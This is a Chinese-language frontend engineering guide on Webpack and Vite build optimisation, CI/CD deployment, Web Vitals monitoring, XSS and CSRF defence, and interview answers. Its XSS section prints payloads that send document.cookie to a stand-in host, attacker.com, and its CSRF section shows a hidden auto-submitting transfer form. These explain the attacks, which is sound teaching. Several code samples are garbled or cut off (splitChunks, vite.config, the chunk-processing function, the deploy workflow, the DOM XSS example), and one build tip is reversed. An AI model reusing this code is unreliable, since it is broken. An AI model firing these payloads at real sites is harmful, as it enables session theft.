## 一、构建工具问题与优化方案

### 1.1 Webpack构建性能瓶颈深度解析

#### 1.1.1 传统Webpack的三大痛点

##### 痛点一：全量编译导致的打包速度瓶颈

**问题描述**：
Webpack通过「loader + plugin」体系处理所有文件，即使只修改了单个模块，也需要重新构建整个依赖图。这导致热更新（HMR）延迟明显，在大型项目中尤为严重。

**技术根因分析**：
```
依赖解析成本 = node_modules依赖树深度 × Babel转译耗时 × TypeScript类型检查耗时
```

对于大型项目，node_modules依赖树深度可达数百层，每次修改都触发全量重建，导致：
- 开发服务器启动时间：30秒～数分钟
- HMR更新时间：3秒～10秒
- 内存占用：通常超过1GB

**实战场景**：
```
场景：团队成员A修改了一个按钮组件
预期：只需重新编译该组件及其依赖
实际：Webpack重新构建整个依赖图，耗时45秒
结果：开发者体验极差，等待时间过长
```

##### 痛点二：配置碎片化

**问题描述**：
Webpack需要手动配置babel-loader、ts-loader、css-loader、sass-loader等数十个loader，一个复杂项目的配置文件轻松超过500行。

**典型配置示例**：
```javascript
// webpack.config.js - 一个典型的大型项目配置
module.exports = {
  module: {
    rules: [
      {
        test: /\.tsx?$/,
        exclude: /node_modules/,
        use: [
          {
            loader: 'babel-loader',
            options: {
              cacheDirectory: true,
              presets: ['@babel/preset-env', '@babel/preset-react', '@babel/preset-typescript']
            }
          },
          {
            loader: 'ts-loader',
            options: {
              transpileOnly: true,  // 跳过类型检查以提升速度
              experimentalWatchApi: true
            }
          }
        ]
      },
      {
        test: /\.css$/,
        use: [
          'style-loader',
          {
            loader: 'css-loader',
            options: {
              modules: {
                auto: true,
                localIdentName: '[name]__[local]--[hash:base64:5]'
              },
              importLoaders: 2
            }
          },
          {
            loader: 'postcss-loader',
            options: {
              postcssOptions: {
                plugins: ['autoprefixer', 'cssnano']
              }
            }
          }
        ]
      },
      {
        test: /\.scss$/,
        use: [
          'style-loader',
          'css-loader',
          'postcss-loader',
          {
            loader: 'sass-loader',
            options: {
              implementation: require('sass')
            }
          }
        ]
      },
      {
        test: /\.(png|jpe?g|gif|svg)$/i,
        use: [
          {
            loader: 'file-loader',
            options: {
              name: 'images/[name].[hash:8].[ext]',
              publicPath: '/assets/'
            }
          },
          {
            loader: 'image-webpack-loader',
            options: {
              mozjpeg: { progressive: true, quality: 65 },
              optipng: { enabled: false },
              gifsicle: { interlaced: false },
              webp: { quality: 75 }
            }
          }
        ]
      },
      {
        test: /\.(woff|woff2|eot|ttf|otf)$/,
        use: [
          {
            loader: 'file-loader',
            options: {
              name: 'fonts/[name].[hash:8].[ext]',
              limit: 8192
            }
          }
        ]
      }
    ]
  }
};
```

##### 痛点三：生产构建优化不足

**问题描述**：
- 默认分包策略难以应对动态路由场景，主包超过1MB

- 图片、字体等静态资源需要额外插件处理

##### 方案五：代码分割与分包策略

```javascript
// splitChunks精细化配置
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',  // 对所有代码进行分割

        // 工具函数单独打包

        },
        // 其他第三方库打包

          priority: 5,

  }
```

### 1.2 Vite带来的革命性优化

#### 1.2.1 Vite的核心优势

##### 优势一：基于ESM的极速启动

**原理分析**：
Vite在开发阶段直接利用浏览器的原生ES模块支持，无需打包。服务器只需预处理少数文件，浏览器直接请求所需模块。

```
传统Webpack流程：
源代码 → 全量构建 → 返回bundle → 浏览器执行
     ↓ (30秒-数分钟)

Vite开发流程：
源代码 → 按需编译(仅当前页面) → 返回ESM → 浏览器直接解析
     ↓ (毫秒级启动)
```

**实际对比**：
| 指标 | Webpack | Vite |
|------|---------|------|
| 冷启动时间 | 30秒-3分钟 | 200-500ms |
| HMR更新时间 | 3-10秒 | 50-100ms |
| 内存占用 | 1-2GB | 200-400MB |
| 开发体验 | 卡顿等待 | 即时响应 |

##### 优势二：基于Rollup的生产构建

```javascript
// vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({

  }
```

### 1.3 构建工具问题排查清单

#### 问题诊断决策树

```
构建失败
├── 依赖安装问题
│   ├── npm install失败 → 检查网络、镜像源、package-lock.json
│   ├── peerDependencies冲突 → 使用npm install --legacy-peer-deps
│   └── 权限问题 → 清除缓存 npm cache clean --force
│
├── 编译错误
│   ├── TypeScript类型错误 → 检查tsconfig.json配置
│   ├── Babel转译错误 → 检查.babelrc或babel.config.js
│   └── 模块解析失败 → 检查resolve.alias和extensions配置
│
├── 性能问题
│   ├── 启动慢 → 启用持久化缓存、检查node_modules
│   ├── HMR慢 → 使用fast-refresh、减少全局状态
│   └── 打包慢 → 使用多进程、分析瓶颈、优化分包
│
└── 生产环境问题
    ├── 资源404 → 检查public目录、base路径配置
    ├── 路径错误 → 检查output.publicPath配置
    └── 缓存失效 → 配置contenthash、使用no-cache策略
```

#### 2.1.2 多环境配置与部署

```yaml
# .github/workflows/deploy.yml
name: Deploy to Multiple Environments

on:
  workflow_dispatch:
    inputs:
      environment:
        description: '部署环境'
        required: true
        type: choice
        options:
          - development
          - staging
          - production

env:
  NODE_VERSION: '20.x'

jobs:
  deploy:
    name: Deploy to ${{ inputs.environment }}
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - name: 检出代码
        uses: actions/checkout@v4

      - name: 设置Node.js环境
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}

      - name: 安装pnpm
        uses: pnpm/action-setup@v2
        with:
          version: '8.x'

      - name: 获取依赖
        run: pnpm install --frozen-lockfile

      - name: 根据环境设置配置
        run: |
          case "${{ inputs.environment }}" in
            development)
              echo "NEXT_PUBLIC_ENV=development" >> $GITHUB_ENV
              echo "NEXT_PUBLIC_API_URL=https://dev-api.example.com" >> $GITHUB_ENV
              ;;
            staging)
              echo "NEXT_PUBLIC_ENV=staging" >> $GITHUB_ENV
              echo "NEXT_PUBLIC_API_URL=https://staging-api.example.com" >> $GITHUB_ENV
              ;;
            production)
              echo "NEXT_PUBLIC_ENV=production" >> $GITHUB_ENV
              echo "NEXT_PUBLIC_API_URL=https://api.example.com" >> $GITHUB_ENV
              ;;
          esac

      - name: 构建应用
        run: pnpm build

      - name: 部署到开发环境
        if: inputs.environment == 'development'
        run: |
          rsync -avz --delete dist/ user@dev-server:/var/www/app/

      - name: 部署到预发环境
        if: inputs.environment == 'staging'
        run: |
          rsync -avz --delete dist/ user@staging-server:/var/www/app/

      - name: 蓝绿部署到生产环境
        if: inputs.environment == 'production'
        run: |
          # 部署到新服务器
          rsync -avz dist/ user@blue-server:/var/www/app-new/
          # 切换流量
          ssh user@load-balancer "switch-traffic blue"
          # 监控健康状态
          sleep 30
          health=$(curl -s -o /dev/null -w "%{http_code}" https://example.com/health)
          if [ "$health" != "200" ]; then
```

```javascript
function processLargeArray(arr) {
  const chunks = [];

  for (let i = 0; i < arr.length; i += chunkSize) {
    chunks.push(arr.slice(i, i + chunkSize));
  }

  return chunks;

async function processWithYield(arr) {

  for (const chunk of chunks) {

          processChunk(chunk);
          resolve();

      } else {
        setTimeout(() => {
          processChunk(chunk);
          resolve();
        }, 0);
      }
    });
  }
}
```

#### 3.2.1 性能数据采集

```javascript
// performance-observer.ts
class PerformanceCollector {
  constructor() {
    this.metrics = {};
    this.setupObservers();
  }

  setupObservers() {
    // LCP监控
    this.observe('largest-contentful-paint', (entry) => {
      this.metrics.lcp = {
        value: entry.startTime,
        element: entry.element?.tagName,
        size: entry.size
      };
    });

    // FID监控
    this.observe('first-input', (entry) => {
      this.metrics.fid = {
        value: entry.processingStart - entry.startTime,
        type: entry.name
      };
    });

    // CLS监控
    this.observe('layout-shift', (entry) => {
      if (!entry.hadRecentInput) {
        this.metrics.cls = this.metrics.cls || 0;
        this.metrics.cls += entry.value;
      }
    });

    // 资源加载监控
    this.observe('resource', (entry) => {
      const resource = {
        name: entry.name,
        type: entry.initiatorType,
        duration: entry.duration,
        size: entry.transferSize
      };

      if (resource.duration > 1000) {
        this.slowResources.push(resource);
      }
    });
  }

  observe(type, callback) {
    const observer = new PerformanceObserver((list) => {
      list.getEntries().forEach(callback);
    });
    observer.observe({ type, buffered: true });
  }

  // 上报数据
  report() {
    const data = {
      timestamp: Date.now(),
      url: location.href,
      metrics: this.metrics,
      navigation: this.getNavigationTiming(),
      memory: this.getMemoryInfo()
    };

    // 发送到监控系统
    navigator.sendBeacon('/api/performance', JSON.stringify(data));
  }

  getNavigationTiming() {
    const [navigation] = performance.getEntriesByType('navigation');
    return {
      ttfb: navigation.responseStart - navigation.requestStart,
      domInteractive: navigation.domInteractive,
      domComplete: navigation.domComplete,
      loadComplete: navigation.loadEventEnd
    };
  }

  getMemoryInfo() {
    if (performance.memory) {
      return {
        usedJSHeapSize: performance.memory.usedJSHeapSize,
        totalJSHeapSize: performance.memory.totalJSHeapSize,
        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
      };
    }
    return null;
  }
}

// 自动上报

  if (document.visibilityState === 'hidden') {
    collector.report();
  }
});
```

### 4.1 XSS攻击深度解析与防御

#### 4.1.1 XSS攻击类型详解

##### 类型一：存储型XSS

**攻击流程**：
```
1. 攻击者向目标网站提交恶意脚本
   ↓
2. 服务器未过滤直接将内容存入数据库
   ↓
3. 其他用户访问包含恶意脚本的页面
   ↓
4. 浏览器执行恶意脚本，窃取Cookie/劫持账号
```

**实战场景**：
```javascript
// 攻击者提交的内容
const maliciousInput = `
  <img src=x onerror="
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
  ">
`;

// 未防护的评论区直接显示
document.getElementById('comments').innerHTML = maliciousInput;
// 结果：用户Cookie被发送到攻击者服务器
```

##### 类型二：反射型XSS

**攻击流程**：
```
1. 攻击者构造恶意URL：https://example.com/search?q=<script>alert(1)</script>
   ↓
2. 诱骗用户点击该URL
   ↓
3. 服务器将URL参数反射回页面
   ↓
4. 浏览器执行恶意脚本
```

**实战场景**：
```javascript
// 服务器端代码（Node.js）
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 直接将用户输入插入HTML，没有任何过滤
  res.send(`<h1>搜索结果: ${query}</h1>`);
});

// 恶意URL
// https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

##### 类型三：DOM型XSS

**攻击流程**：
```
1. 攻击者构造恶意URL：https://example.com/#anchor=<img src=x onerror=alert(1)>
   ↓
2. 用户访问URL
   ↓
3. 前端JavaScript从URL读取内容并渲染
   ↓
4. 恶意脚本执行
```

**实战场景**：
```javascript
// 不安全的代码
```

### 4.2 CSRF攻击防御

#### 4.2.1 CSRF攻击原理

**攻击流程**：
```
1. 用户登录网站A，获取有效Session
   ↓
2. 用户被诱骗访问恶意网站B
   ↓
3. 网站B中的表单自动提交到网站A
   ↓
4. 浏览器自动携带网站A的Cookie
   ↓
5. 网站A认为是合法请求，执行操作
```

**实战场景**：
```html
<!-- 恶意网站B的HTML -->
<html>

  <h1>恭喜您中奖了！</h1>
  <!-- 隐藏的转账表单 -->

    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

```javascript
// 验证Token
function validateCsrfToken(req, res, next) {

  if (token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  next();
}

// Express路由保护
```

## 六、问题排查速查表

### 6.1 构建问题速查

| 问题现象 | 可能原因 | 解决方案 |
|---------|---------|---------|
| 构建失败，提示模块找不到 | 路径别名未配置 | 检查resolve.alias配置 |
| 内存溢出 | 打包文件过大 | 增加Node内存限制 |
| 缓存失效 | lock文件变更 | 清除.cache目录 |
| 样式丢失 | CSS loader配置错误 | 检查module.rules |
| 热更新失效 | React Refresh配置问题 | 检查vite.config.js |

### 6.2 CI/CD问题速查

| 问题现象 | 可能原因 | 解决方案 |
|---------|---------|---------|
| Runner离线 | 服务未启动 | 重启Runner服务 |
| 构建超时 | 网络问题或依赖问题 | 检查网络或添加超时配置 |
| 权限不足 | 自托管Runner权限配置 | 修改Runner用户权限 |
| 缓存失效 | 缓存key变化 | 检查缓存key配置 |
| 部署失败 | 服务器连接问题 | 检查SSH配置 |

### 6.3 性能问题速查

| 问题现象 | 可能原因 | 解决方案 |
|---------|---------|---------|
| 首屏加载慢 | 大Bundle未分割 | 配置splitChunks |
| 图片加载慢 | 未使用现代格式 | 使用WebP/AVIF |
| CLS过高 | 资源未指定尺寸 | 添加width/height |
| LCP过高 | 服务器响应慢 | 优化TTFB |
| FID过高 | 长任务阻塞主线程 | 分解长任务 |

### 6.4 安全问题速查

| 问题现象 | 可能原因 | 解决方案 |
|---------|---------|---------|
| XSS攻击 | 未过滤用户输入 | 使用DOMPurify |
| CSRF攻击 | 未使用Token | 实现CSRF Token |
| Cookie泄露 | 缺少HttpOnly | 添加HttpOnly标志 |
| 点击劫持 | 缺少X-Frame-Options | 添加防护头 |
| 中间人攻击 | 未使用HTTPS | 强制HTTPS |

## 七、面试核心问题详解

### 问题一：谈谈Webpack的构建优化策略

**考察点**：构建性能优化理解深度

**参考答案**：
Webpack优化主要从构建速度和构建体积两个维度入手：

**构建速度优化**：
1. 开启持久化缓存（cache: filesystem）
2. 使用多进程并行构建（thread-loader/esbuild-loader）
3. 合理配置resolve路径和extensions减少查找
4. 开启babel-loader和ts-loader的缓存
5. 使用sourcemap而非cheap-module-source-map

**构建体积优化**：
1. 配置splitChunks进行代码分割
2. 启用TreeShaking消除死代码
3. 压缩CSS/JS（cssnano/terser）
4. 使用动态import实现按需加载
5. 提取runtime代码独立打包

### 问题二：如何设计一个前端安全策略？

**考察点**：安全意识和防御深度

**参考答案**：
前端安全需要多层次防御：

**输入层**：
- 所有用户输入必须验证和过滤
- 使用白名单而非黑名单
- 对特殊字符进行转义

**输出层**：
- 根据输出上下文进行适当编码
- 使用textContent而非innerHTML
- 使用DOMPurify净化富文本

**传输层**：
- 全站强制HTTPS
- 设置Secure和HttpOnly Cookie
- 合理配置CORS

**响应头**：
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security

**业务层**：
- CSRF Token验证
- 请求来源验证
- 敏感操作二次验证

### 问题三：Web Vitals优化思路

**考察点**：性能优化实战能力

**参考答案**：
三大Core Web Vitals的优化策略：

**LCP（最大内容绘制）**：
- 优化TTFB（服务器响应时间）
- 使用CDN加速静态资源
- 预加载关键资源
- 优化图片格式和大小
- 关键CSS内联

**FID（首次输入延迟）**：
- 分解长任务
- 使用requestIdleCallback
- 延迟加载非关键脚本
- 第三方脚本异步加载

**CLS（累积布局偏移）**：
- 图片和视频始终指定尺寸
- 使用aspect-ratio
- 字体加载使用font-display
- 动态内容预留空间
- 骨架屏占位
